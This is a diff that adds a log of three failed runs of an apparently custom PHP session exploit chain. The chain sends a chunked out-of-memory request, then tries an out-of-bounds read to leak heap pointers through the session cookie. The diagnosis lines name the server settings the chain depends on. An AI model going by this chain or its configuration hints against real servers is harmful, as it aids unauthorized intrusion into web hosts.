@@ -1,0 +1,27 @@
+
+=== 2026-10-23T08:05:27.947402+00:00 ===
+[*] leak-only: A1 + B1 (runtime address resolution)
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=253 set-cookie=[34]
+[!] leak failed: RuntimeError('no heap pointers in leak window (decoded=34 bytes); top qwords: 0x616f626667336963*1, 0x6d766b373176666b*1, 0x6233386367686563*1, 0x68746170203b6930*1')
+[!] diagnosis: B1 returned a normal-length session cookie — the A1 arming OOM never landed on this host. Typical causes: memory_limit far above ~40M, session.upload_progress disabled, or no active session on the target page. The chain assumes stock php.ini-production geometry.
+
+=== 2026-10-23T08:25:26.712466+00:00 ===
+[*] leak-only: A1 + B1 (runtime address resolution)
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='' bytes=0 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=253 set-cookie=[34]
+[!] leak failed: RuntimeError('no heap pointers in leak window (decoded=34 bytes); top qwords: 0x303163686e693532*1, 0x6764616e74743571*1, 0x306e333061363774*1, 0x68746170203b6a66*1')
+[!] diagnosis: B1 returned a normal-length session cookie — the A1 arming OOM never landed on this host. Typical causes: memory_limit far above ~40M, session.upload_progress disabled, or no active session on the target page. The chain assumes stock php.ini-production geometry.
+
+=== 2026-10-23T08:26:40.493608+00:00 ===
+[*] leak-only: A1 + B1 (runtime address resolution)
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='' bytes=0 set-cookie=none
+[!] leak failed: RuntimeError('no Set-Cookie in leak response (0 bytes)')
+[!] diagnosis: no Set-Cookie at all — a CDN/reverse proxy likely dropped the oversized header, or the session module refused the crafted id
